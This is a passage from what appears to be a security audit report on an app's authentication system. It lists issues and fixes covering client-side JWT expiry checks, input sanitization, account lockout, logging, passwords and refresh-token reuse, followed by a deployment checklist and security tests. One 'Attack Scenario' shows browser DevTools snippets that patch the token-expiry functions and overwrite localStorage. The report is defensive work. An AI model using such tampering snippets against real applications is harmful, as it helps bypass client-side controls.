- [ ] Monitor for timing attack patterns
- [ ] Document security properties for audits

---

### Issue #7: Client-Side Token Expiry Checking Creates Attack Surface

**Severity:** 🟠 MEDIUM (5/10)
**Files Affected:**
- `/packages/client/src/contexts/auth-context.tsx:77-84`
- `/packages/client/src/lib/router/auth.ts:52-62`

#### Vulnerability Description

Client-side JavaScript checks token expiry, which is **trivially bypassable** by attackers who can modify client code.

```typescript
// Client-side expiry check - attacker can bypass!
const isTokenExpired = (token: string): boolean => {
  const decoded = jwtDecode<JWTPayload>(token)
  return decoded.exp * 1000 < Date.now()
}

// Attacker patches:
isTokenExpired = () => false  // Never expires!
```

#### Attack Scenario

```javascript
// Attacker opens browser DevTools
// Method 1: Monkey-patch the function
window.isTokenExpired = () => false

// Method 2: Modify jwt-decode library
const originalJwtDecode = window.jwtDecode
window.jwtDecode = (token) => {
  const decoded = originalJwtDecode(token)
  decoded.exp = Date.now() / 1000 + 999999 // Far future
  return decoded
}

// Method 3: Modify localStorage directly
localStorage.setItem('promptliano_access_token', 'old-expired-token')

// Now client thinks token is valid forever
// (Server will still reject, but creates confusion/bugs)
```

#### Complete Fix Implementation

**Step 1: Remove Client-Side Expiry Authority**

File: `/packages/client/src/lib/router/auth.ts`

```typescript
/**
 * Get auth state from localStorage
 * DO NOT check token expiry client-side - server is authoritative
 */
export function getAuthState(): AuthState {
  try {
    const userStr = localStorage.getItem('promptliano_user')

    if (!userStr) {
      return { isAuthenticated: false, user: null }
    }

    // ✅ Simple check: user data exists = authenticated
    // Server will validate token on actual requests
    const user = JSON.parse(userStr) as User
    return { isAuthenticated: true, user }
  } catch (error) {
    console.error('Error getting auth state:', error)
    return { isAuthenticated: false, user: null }
  }
}

// ❌ REMOVE client-side token expiry checking
// Delete these functions:
// - isTokenExpired()
// - getAuthState() token decoding
// - Any jwt-decode usage for security decisions
```

**Step 2: Update Auth Context - Server-Authoritative**

File: `/packages/client/src/contexts/auth-context.tsx`

```typescript
export function AuthProvider({ children, serverUrl }: AuthProviderProps) {
  const [user, setUser] = useState<User | null>(null)
  const [isLoading, setIsLoading] = useState(true)

  // ✅ Verify session validity by calling server
  useEffect(() => {
    const verifySession = async () => {
      try {
        const userStr = localStorage.getItem(STORAGE_KEYS.USER)
        if (!userStr) {
          setIsLoading(false)
          return
        }

        // Ask SERVER if session is valid (httpOnly cookie will be sent)
        const response = await authClient.getCurrentUser()

        if (response.user) {
          setUser(response.user)
          localStorage.setItem(STORAGE_KEYS.USER, JSON.stringify(response.user))
        } else {
          // Server says session invalid - clear local data
          localStorage.removeItem(STORAGE_KEYS.USER)
        }
      } catch (error) {
        // Server rejected session - clear auth
        console.error('Session validation failed:', error)
        localStorage.removeItem(STORAGE_KEYS.USER)
        setUser(null)
      } finally {
        setIsLoading(false)
      }
    }

    verifySession()
  }, [])

  // ✅ Periodic refresh - let server decide when to refresh
  useEffect(() => {
    if (!user) return

    const interval = setInterval(async () => {
      try {
        // Call refresh endpoint
        // Server will check expiry and decide if refresh is needed
        await authClient.refreshToken({})
      } catch (error) {
        // Refresh failed - session expired
        console.error('Token refresh failed:', error)
        await logout()
      }
    }, 5 * 60 * 1000) // Every 5 minutes

    return () => clearInterval(interval)
  }, [user])

  // ... rest of implementation
}
```

**Step 3: API Client - Let Server Handle Expiry**

File: `/packages/api-client/src/base-client.ts`

```typescript
protected async request<TResponse>(
  method: string,
  endpoint: string,
  options?: RequestOptions
): Promise<TResponse> {
  try {
    const response = await this.customFetch(url.toString(), {
      method,
      headers,
      body,
      credentials: 'include', // ✅ Send cookies automatically
    })

    // ✅ Handle 401 from server (authoritative source)
    if (response.status === 401) {
      // Token expired or invalid
      // Try to refresh automatically
      try {
        await this.refreshSession()
        // Retry original request
        return this.request(method, endpoint, options)
      } catch (refreshError) {
        // Refresh failed - session truly expired
        // Trigger logout/redirect
        throw new PromptlianoError(
          'Session expired',
          401,
          'SESSION_EXPIRED'
        )
      }
    }

    // ... rest of implementation
  } catch (error) {
    // Handle errors
  }
}

/**
 * Automatic session refresh on 401
 */
private async refreshSession(): Promise<void> {
  const response = await fetch(`${this.baseUrl}/api/auth/refresh`, {
    method: 'POST',
    credentials: 'include'
  })

  if (!response.ok) {
    throw new Error('Refresh failed')
  }
}
```

**Step 4: Automatic Token Refresh Interceptor**

File: `/packages/api-client/src/interceptors/auto-refresh.ts`

```typescript
/**
 * Automatic token refresh interceptor
 * Retries failed requests after refreshing token
 */
export async function withAutoRefresh<T>(
  requestFn: () => Promise<T>,
  refreshFn: () => Promise<void>
): Promise<T> {
  try {
    return await requestFn()
  } catch (error) {
    if (error instanceof PromptlianoError && error.statusCode === 401) {
      // Try to refresh
      try {
        await refreshFn()
        // Retry original request
        return await requestFn()
      } catch (refreshError) {
        // Refresh failed - propagate error
        throw refreshError
      }
    }
    throw error
  }
}

// Usage in client
const user = await withAutoRefresh(
  () => authClient.getCurrentUser(),
  () => authClient.refreshToken({})
)
```

**Step 5: UX - Show Expiry Warning (Non-Security)**

For better UX, you can ESTIMATE expiry for showing warnings, but never for security:

```typescript
/**
 * OPTIONAL: Estimate session expiry for UX only
 * ⚠️ This is NOT for security - server is authoritative
 */
function useSessionExpiryWarning() {
  const [showWarning, setShowWarning] = useState(false)

  useEffect(() => {
    // Estimate: session likely expires in ~15 minutes
    // This is just for UX - not security
    const timeout = setTimeout(() => {
      setShowWarning(true)
    }, 10 * 60 * 1000) // Show warning after 10 minutes

    return () => clearTimeout(timeout)
  }, [])

  if (showWarning) {
    return (
      <Toast>
        Your session will expire soon. Your work is automatically saved.
      </Toast>
    )
  }

  return null
}
```

#### Verification Testing

```javascript
// Test that client-side bypass doesn't work
describe('Server-Authoritative Auth', () => {
  test('client cannot bypass expiry', async () => {
    // Login normally
    const { accessToken } = await login('test', 'password')

    // Wait for token to expire
    await sleep(16 * 60 * 1000) // 16 minutes

    // Try to use expired token
    // Even if client thinks it's valid, server should reject
    try {
      await apiClient.getCurrentUser()
      fail('Should have rejected expired token')
    } catch (error) {
      expect(error.statusCode).toBe(401)
    }
  })

  test('auto-refresh works on 401', async () => {
    // Make request that triggers 401
    // Should automatically refresh and retry
    const user = await apiClient.getCurrentUser()
    expect(user).toBeDefined()
  })
})
```

#### Deployment Checklist

- [ ] Remove all client-side token expiry checks
- [ ] Remove jwt-decode usage for security decisions
- [ ] Implement server-authoritative session validation
- [ ] Add automatic refresh on 401
- [ ] Test that client bypass doesn't work
- [ ] Update documentation about session handling

---

## 🟡 MEDIUM-PRIORITY ISSUES (P2 - Fix Within Month 1)

### Issue #8: Missing Input Sanitization and Validation

**Severity:** 🟡 MEDIUM (5/10)
**Files Affected:**
- All routes accepting user input
- `/packages/server/src/routes/auth-routes.ts`
- `/packages/server/src/routes/admin-routes.ts`

#### Quick Fix

```bash
bun add isomorphic-dompurify validator
```

```typescript
import DOMPurify from 'isomorphic-dompurify'
import validator from 'validator'

export function sanitizeInput(input: string, maxLength: number = 255): string {
  if (!input) return ''

  // Trim and limit length
  let sanitized = input.trim().substring(0, maxLength)

  // Remove dangerous characters
  sanitized = DOMPurify.sanitize(sanitized, { ALLOWED_TAGS: [] })

  return sanitized
}

// In routes:
const { username, email } = c.req.valid('json')
const sanitizedUsername = sanitizeInput(username, 255)
const sanitizedEmail = email ? validator.normalizeEmail(email) : null

if (email && !validator.isEmail(email)) {
  throw ErrorFactory.invalidInput('email', 'valid email address')
}
```

---

### Issue #9: No Account Lockout After Failed Login Attempts

**Severity:** 🟡 MEDIUM (5/10)

#### Quick Fix - Add Login Attempts Table

```typescript
// Database schema
export const loginAttempts = sqliteTable('login_attempts', {
  id: integer('id').primaryKey(),
  username: text('username').notNull(),
  ipAddress: text('ip_address').notNull(),
  successful: integer('successful', { mode: 'boolean' }).notNull(),
  attemptedAt: integer('attempted_at').notNull()
})

// Repository
async function recordLoginAttempt(
  username: string,
  ipAddress: string,
  successful: boolean
): Promise<void> {
  await db.insert(loginAttempts).values({
    username,
    ipAddress,
    successful,
    attemptedAt: Date.now()
  })
}

async function getRecentFailedAttempts(
  username: string,
  windowMs: number
): Promise<number> {
  const since = Date.now() - windowMs
  const [result] = await db
    .select({ count: count() })
    .from(loginAttempts)
    .where(
      and(
        eq(loginAttempts.username, username),
        eq(loginAttempts.successful, false),
        gte(loginAttempts.attemptedAt, since)
      )
    )

  return result?.count || 0
}

// In auth service
const failedAttempts = await getRecentFailedAttempts(username, 15 * 60 * 1000)
if (failedAttempts >= 5) {
  throw ErrorFactory.tooManyRequests(
    'Account temporarily locked due to too many failed attempts. Try again in 15 minutes.'
  )
}
```

---

### Issue #10: Sensitive Data Logged

**Severity:** 🟡 MEDIUM (4/10)

#### Quick Fix

```typescript
// NEVER log:
// - Passwords (obviously)
// - Tokens
// - Email addresses
// - Usernames in public logs

// BAD:
logger.info('User logged in', { username: user.username })

// GOOD:
logger.info('User logged in', { userId: user.id })

// Create separate security audit log
const securityAudit = createLogger('SecurityAudit')
securityAudit.log({
  event: 'USER_LOGIN',
  userId: user.id,
  ipAddress: getClientIp(c),
  userAgent: c.req.header('user-agent'),
  timestamp: Date.now()
})
```

---

### Issue #11: Weak Password Requirements

**Severity:** 🟡 MEDIUM (4/10)

#### Quick Fix

```typescript
import passwordValidator from 'password-validator'

const passwordSchema = new passwordValidator()
passwordSchema
  .is().min(12)
  .is().max(128)
  .has().uppercase()
  .has().lowercase()
  .has().digits(1)
  .has().symbols(1)
  .has().not().spaces()

const StrongPasswordSchema = z.string()
  .min(12, 'Password must be at least 12 characters')
  .max(128, 'Password must be at most 128 characters')
  .refine(
    (password) => passwordSchema.validate(password),
    'Password must contain uppercase, lowercase, numbers, and symbols'
  )
```

---

### Issue #12: Inconsistent Error Messages Leak Information

**Severity:** 🟢 LOW (3/10)

#### Quick Fix

```typescript
// BAD: Different messages reveal info
if (!user) throw ErrorFactory.notFound('User', username)
if (!user.isActive) throw ErrorFactory.badRequest('User inactive')
if (!isValid) throw ErrorFactory.unauthorized('Invalid password')

// GOOD: Same generic message
const GENERIC_AUTH_ERROR = 'Invalid credentials'

if (!user || !user.isActive || !isValid) {
  throw ErrorFactory.unauthorized(GENERIC_AUTH_ERROR)
}
```

---

### Issue #13: No Refresh Token Reuse Detection

**Severity:** 🟢 LOW (3/10)

#### Quick Fix - Token Families

```typescript
// Add token family tracking
export const refreshTokenFamilies = sqliteTable('refresh_token_families', {
  id: integer('id').primaryKey(),
  userId: integer('user_id').notNull(),
  familyId: text('family_id').notNull(),
  isRevoked: integer('is_revoked', { mode: 'boolean' }).default(false),
  createdAt: integer('created_at').notNull()
})

// On refresh, check for reuse
async function refreshAccessToken(refreshToken: string): Promise<AuthTokens> {
  const tokenData = await getRefreshTokenWithFamily(refreshToken)

  if (!tokenData) {
    // Check if this token was previously used
    const previousUse = await wasPreviouslyUsed(refreshToken)

    if (previousUse) {
      // SECURITY: Token reuse detected!
      // Revoke entire token family
      await revokeTokenFamily(previousUse.familyId)

      logger.security('REFRESH_TOKEN_REUSE_DETECTED', {
        userId: previousUse.userId,
        familyId: previousUse.familyId
      })

      throw ErrorFactory.unauthorized('Token reuse detected - all sessions revoked')
    }

    throw ErrorFactory.unauthorized('Invalid refresh token')
  }

  // ... continue with refresh
}
```

---

## 📋 PRODUCTION DEPLOYMENT CHECKLIST

### Critical Pre-Deployment Steps

#### Environment Configuration

- [ ] Generate strong JWT_SECRET: `openssl rand -base64 64`
- [ ] Store JWT_SECRET in secure secrets manager (AWS Secrets Manager, Vault, etc.)
- [ ] Set `NODE_ENV=production`
- [ ] Configure `FORCE_HTTPS=true`
- [ ] Set `SECURE_COOKIES=true`
- [ ] Configure `CLIENT_URL` for CORS
- [ ] Set up Redis for rate limiting (production)
- [ ] Configure monitoring/logging service

#### Security Hardening

- [ ] Enable httpOnly cookies for token storage
- [ ] Implement CSRF protection
- [ ] Enable rate limiting on all auth endpoints
- [ ] Add token blacklist for revocation
- [ ] Fix timing attacks in authentication
- [ ] Enable strong password requirements
- [ ] Add account lockout mechanism
- [ ] Sanitize all user inputs
- [ ] Remove sensitive data from logs

#### Testing & Validation

- [ ] Run security test suite
- [ ] Perform penetration testing
- [ ] Verify HTTPS enforcement
- [ ] Test rate limits under load
- [ ] Validate CSRF protection
- [ ] Test token revocation
- [ ] Verify password strength enforcement
- [ ] Test account lockout

#### Monitoring & Alerting

- [ ] Set up logging for auth events
- [ ] Create alerts for:
  - High rate of failed logins
  - Token revocations
  - CSRF violations
  - Account lockouts
  - Unusual authentication patterns
- [ ] Monitor token blacklist size
- [ ] Track authentication latency
- [ ] Set up security dashboard

#### Documentation

- [ ] Document JWT secret rotation procedure
- [ ] Create incident response playbook
- [ ] Document rate limits for API consumers
- [ ] Update security policy
- [ ] Create user security guidelines
- [ ] Document admin security procedures

---

## 🔍 TESTING & VALIDATION PROCEDURES

### Security Test Suite

Create comprehensive security tests:

```bash
cd packages/server
bun run test:security
```

```typescript
// packages/server/src/tests/security/auth-security.test.ts

describe('Authentication Security', () => {
  describe('JWT Secret Validation', () => {
    test('should reject weak JWT secret in production', () => {
      process.env.NODE_ENV = 'production'
      process.env.JWT_SECRET = 'weak'

      expect(() => {
        require('../auth-service')
      }).toThrow('JWT_SECRET must be at least 32 characters')
    })
  })

  describe('Rate Limiting', () => {
    test('should block after 5 failed login attempts', async () => {
      for (let i = 0; i < 5; i++) {
        await loginAttempt('test', 'wrong')
      }

      // 6th attempt should be blocked
      await expect(
        loginAttempt('test', 'wrong')
      ).rejects.toThrow('Rate limit exceeded')
    })
  })

  describe('CSRF Protection', () => {
    test('should reject request without CSRF token', async () => {
      await expect(
        fetch('/api/admin/users', {
          method: 'POST',
          body: JSON.stringify({ username: 'test' })
        })
      ).rejects.toThrow('CSRF token validation failed')
    })
  })

  describe('Token Revocation', () => {
    test('should reject blacklisted token', async () => {
      const { accessToken } = await login('test', 'password')
      const decoded = jwtDecode(accessToken)

      await revokeToken(decoded.jti)

      await expect(
        apiCall(accessToken)
      ).rejects.toThrow('Invalid or expired token')
    })
  })

  describe('Timing Attacks', () => {
    test('should have constant timing for valid/invalid users', async () => {
      const validTimes = []
      const invalidTimes = []

      for (let i = 0; i < 50; i++) {
        validTimes.push(await measureLoginTime('admin', 'wrong'))
        invalidTimes.push(await measureLoginTime('nonexistent', 'wrong'))
      }

      const validAvg = average(validTimes)
      const invalidAvg = average(invalidTimes)

      // Times should be within 10% of each other
      expect(Math.abs(validAvg - invalidAvg) / validAvg).toBeLessThan(0.1)
    })
  })
})
```

---

## 📚 REFERENCES & RESOURCES

### OWASP Resources

- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

### Security Standards

- [NIST Password Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [CWE Top 25 Most Dangerous Software Weaknesses](https://cwe.mitre.org/top25/)

### Tools & Libraries

- [jwt.io](https://jwt.io/) - JWT debugger
- [OWASP ZAP](https://www.zaproxy.org/) - Security scanner
- [Burp Suite](https://portswigger.net/burp) - Web security testing
- [npm audit](https://docs.npmjs.com/cli/v8/commands/npm-audit) - Dependency scanning

---

## 🏁 SUMMARY & NEXT STEPS

### Implementation Priority

**Week 1 (Critical - 2-3 days):**
1. Fix JWT secret validation (2 hours)
2. Migrate to httpOnly cookies (1 day)
3. Implement rate limiting (4 hours)
4. Add CSRF protection (4 hours)

**Week 2 (High Priority - 3-5 days):**
1. Add token blacklist (6 hours)
2. Fix timing attacks (3 hours)
3. Remove client-side token authority (2 hours)

**Month 1 (Medium Priority - 1 week):**
1. Input sanitization (4 hours)
2. Account lockout (5 hours)
3. Strong passwords (3 hours)
4. Audit logging (2 hours)
5. Error message consistency (2 hours)

### Final Thoughts

Your authentication system has **excellent architectural foundations**:
- ✅ Modern stack (Drizzle, Hono, JWT)
- ✅ Functional patterns
- ✅ Token rotation
- ✅ Role-based access control

The **critical vulnerabilities** are fixable with focused effort:
- 🔴 JWT secret → 2 hours
- 🔴 Token storage → 1 day
- 🟠 Rate limiting → 4 hours
- 🟠 CSRF → 4 hours

**Total effort: ~2 weeks for comprehensive security hardening**

For questions or implementation help, refer to the code examples above or consult security resources listed in the References section.

---

**Document Version:** 1.0
**Last Updated:** 2025-10-04
**Next Review:** After implementing critical fixes
